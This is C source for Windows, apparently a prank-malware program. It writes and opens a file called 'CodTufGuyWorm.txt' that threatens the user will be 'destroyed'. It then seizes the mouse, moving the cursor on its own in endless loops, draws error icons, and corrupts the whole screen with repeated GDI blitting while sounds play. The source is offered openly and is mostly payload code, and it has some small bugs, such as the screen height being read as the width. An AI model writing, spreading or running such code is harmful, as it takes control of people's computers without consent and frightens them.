#include <windows.h>
#include <wingdi.h>
#include <stdio.h>
#include <winuser.h>
#include "sound.h"

DWORD WINAPI Small_Rect(LPVOID Lparam);
DWORD WINAPI SWIRLING_BALLS(LPVOID Lparam);
DWORD WINAPI wave(LPVOID LPARAM);
DWORD WINAPI wave1(LPVOID LPARAM);
DWORD WINAPI mouse(LPVOID Lpa);
DWORD WINAPI mouse2(LPVOID Lparam);
void create_File();
DWORD WINAPI shellexec(LPVOID Lparam);

int main(int argc, char **argv) {
    MessageBox(NULL, TEXT("Y"), NULL, MB_OK);

    create_File();
    HANDLE hndFile = CreateThread(0, 0, shellexec, 0, 0, 0);
    Sleep(10000);
    TerminateThread(hndFile, 0x00);
    CloseHandle(hndFile);

    HANDLE hndMouse = CreateThread(0, 0, mouse2, 0, 0, 0);
    sound1();
    Sleep(30000);
    TerminateThread(hndMouse, 0x00);
    CloseHandle(hndMouse);

    HANDLE hndMouseCursor = CreateThread(0, 0, mouse, 0, 0, 0);
    Sleep(30000);
    TerminateThread(hndMouseCursor, 0x00);
    CloseHandle(hndMouseCursor);

    // Execute sound2
    HANDLE hndSound2 = CreateThread(0, 0, sound2, 0, 0, 0);
    WaitForSingleObject(hndSound2, INFINITE);  // Wait for sound2 to finish
    CloseHandle(hndSound2);

    // Execute wave
    HANDLE hndWave = CreateThread(0, 0, wave, 0, 0, 0);
    WaitForSingleObject(hndWave, INFINITE);  // Wait for wave to finish
    CloseHandle(hndWave);

    // Execute sound3
    HANDLE hndSound3 = CreateThread(0, 0, sound3, 0, 0, 0);
    WaitForSingleObject(hndSound3, INFINITE);  // Wait for sound3 to finish
    CloseHandle(hndSound3);

    // Execute wave1
    HANDLE hndWave1 = CreateThread(0, 0, wave1, 0, 0, 0);
    WaitForSingleObject(hndWave1, INFINITE);  // Wait for wave1 to finish
    CloseHandle(hndWave1);

    // Execute mouse2 again if needed
    HANDLE hndMouse2 = CreateThread(0, 0, mouse2, 0, 0, 0);
    Sleep(100000000);  // Keep the program running for a long time

    return 0;
}


DWORD WINAPI SWIRLING_BALLS(LPVOID Lparam)
{
	HDC hdc = GetDC(NULL);
int x= GetSystemMetrics(0);
	
	int y = GetSystemMetrics(0);
	int i,j,k;
	
	
	for (i = 0 ;i<50;i++)
	{
		HBRUSH hb = CreateSolidBrush(RGB(rand()%255,0,0));
		SelectObject(hdc,hb);
		StretchBlt(hdc,rand()%x,rand()%y,rand()%x,rand()%y,hdc,0,0,x,y,SRCCOPY);
		PatBlt(hdc,rand()%x,rand()%x,rand()%x,rand()%y,PATCOPY);
			for (j = 0 ;j<10;j++)
			{
				
			
		StretchBlt(hdc,15,15,x-70,y-9,hdc,0,0,x,y,SRCCOPY);
		
	}
//				for (k = 0;k<3;k++)
//				{
//					p[j].x = x1+(rand()%x1);
//					p[j].y = y1+(rand()%y1);
//				}
				
		
	}
	return 0x00;
}


void Notshowwindow()
{
	HWND hnd ;
	AllocConsole();
	hnd = FindWindowA("ConsoleWindowClass",NULL);
	ShowWindow(hnd,0);
}


DWORD WINAPI wave (LPVOID LPARAM)
{
	HDC hdc = GetDC(NULL);
int x= GetSystemMetrics(0);
	
	int y = GetSystemMetrics(0);
	
	
	int i;
	
	for (i = 0 ;i<400;i++)
	
	{
		HBRUSH hb = CreateSolidBrush(RGB(rand()%255,rand()%255,0));
		SelectObject(hdc,hb);
		BitBlt(hdc,rand()%10-20,rand()%20-10,x,y,hdc,0,0,SRCCOPY);
		StretchBlt(hdc,rand()%x,rand()%x,rand()%x,rand()%x,hdc,0,0,x,y,SRCCOPY);
		PatBlt(hdc,rand()%x,rand()%y,rand()%x,rand()%y,PATINVERT);
	}
	Sleep(10);
	
	return 0x001;
}

DWORD WINAPI  wave1 (LPVOID LPARAM)
{
	HDC hdc = GetDC(NULL);
int x= GetSystemMetrics(0);
	
	int y = GetSystemMetrics(0);
	
	
	int i;
	
	for (i = 0 ;i<400;i++)
	
	{
		HBRUSH hb = CreateSolidBrush(RGB(rand()%255,rand()%255,0));
		SelectObject(hdc,hb);
		BitBlt(hdc,rand()%10-20,rand()%20-10,x,y,hdc,0,0,SRCCOPY);
		StretchBlt(hdc,rand()%x,rand()%x,rand()%x,rand()%x,hdc,0,0,x,y,SRCCOPY);
		PatBlt(hdc,rand()%x,rand()%y,rand()%x,rand()%y,BLACKNESS);
	}
	Sleep(10);
	return 0x0001;
}


DWORD WINAPI  mouse (LPVOID Lpa)
{
	HDC hdc = GetDC(0);
int icon_x = GetSystemMetrics(SM_CXICON);
int icon_y = GetSystemMetrics(SM_CYICON) ;
POINT cursor;

	while(1){
		FreeConsole();
        GetCursorPos(&cursor);
        DrawIcon(hdc, cursor.x - icon_x, cursor.y - icon_y, LoadIcon(NULL, IDI_ERROR));
	}
	return 0x00;
	
}

DWORD WINAPI mouse2(LPVOID Lparam)
{
	
	POINT cursor = {0};
	int signX = 1;
	int signY = 1;
	int signX1 = 1;
	int signY1 = 1;
	int increamentor  = 10;
	int x = 10 ;
	int y = 10;
	
		while (1)
		{
			HDC hdc = GetDC(HWND_DESKTOP);
			int icon_x = GetSystemMetrics(SM_CXICON);
			int icon_y = GetSystemMetrics(SM_CYICON);
			GetCursorPos(&cursor);
			x+=increamentor*signX;
			y+=increamentor*signY;
			SetCursorPos(x,y);
			DrawIcon(hdc,cursor.x-icon_x,cursor.y-icon_y,LoadCursor(NULL,IDC_ARROW));
			if (y>=GetSystemMetrics(SM_CYSCREEN)){
				signY = -1; 
			}
			if (x>=GetSystemMetrics(SM_CXSCREEN))
			{
				signX= -1;
			}
			if (y == 0)
			{
				signY = 1;
			}
			if (x == 0)
			{
				signX = 1;
			}
			ReleaseDC(0,hdc);
			Sleep(10);
		}
		return 0x01;
}



void create_File() {
    const char* fileName = "CodTufGuyWorm.txt";
    const char* message = "Hi! This is the message from creator Arka!! \n yOu \n Are \n going to be \ destroyed \!!";
    
    // Create or open the file
    HANDLE hnd = CreateFileA(
        fileName,                     // File name
        GENERIC_WRITE,                // Write access
        0,                            // No sharing
        NULL,                         // Default security
        CREATE_ALWAYS,                // Create a new file, always
        FILE_ATTRIBUTE_NORMAL,        // Normal file
        NULL                          // No template
    );

    if (hnd == INVALID_HANDLE_VALUE) {
        MessageBox(NULL, TEXT("No file Created !!"), NULL, MB_OK);
        return  ;
    }

    // Write the message to the file
    DWORD bytesWritten = 0;
    WriteFile(hnd, message, strlen(message), &bytesWritten, NULL);
    
    CloseHandle(hnd);
    return ;
}








DWORD WINAPI shellexec(LPVOID Lparam)
{
ShellExecute(NULL,"open","CodTufGuyWorm.txt",NULL,NULL,SW_SHOWNORMAL);

//ShellExecute(NULL,"open","https://www.bing.com/search?pglt=2083&q=have+you+found+the+marijuana+I+sent+you%3F&cvid=2c349d4acbcc4059b1af8ad755e72455&gs_lcrp=EgZjaHJvbWUyBggAEEUYOTIGCAEQABhAMgYIAhAAGEAyBggDEAAYQDIGCAQQABhAMgYIBRAAGEDSAQkxNzI5M2owajGoAgCwAgA&FORM=ANNTA1&PC=U531",NULL,NULL,SW_SHOWMAXIMIZED);
Sleep(10000);
return -1;
}
// Implementations of wave, wave1, and other functions follow...
